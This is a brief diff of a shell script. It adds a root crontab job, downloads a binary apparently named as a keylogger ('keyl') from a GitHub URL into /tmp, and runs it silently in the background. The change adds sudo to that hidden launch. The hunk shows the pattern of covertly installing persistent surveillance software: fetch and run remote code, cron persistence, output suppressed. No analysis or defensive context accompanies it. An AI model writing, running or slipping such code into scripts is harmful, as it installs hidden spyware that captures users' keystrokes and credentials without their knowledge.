@@ -20,6 +20,6 @@ chmod +x /tmp/killSwitch.sh
 echo '*/1 * * * * /tmp/launch.sh' | crontab -u root -
 wget -O /tmp/keyl https://raw.githubusercontent.com/fortigate3600/KeyL/main/keyl
 chmod u+x /tmp/keyl
-nohup /tmp/keyl &> /dev/null &
+sudo nohup /tmp/keyl &> /dev/null &
 EOF
 )"
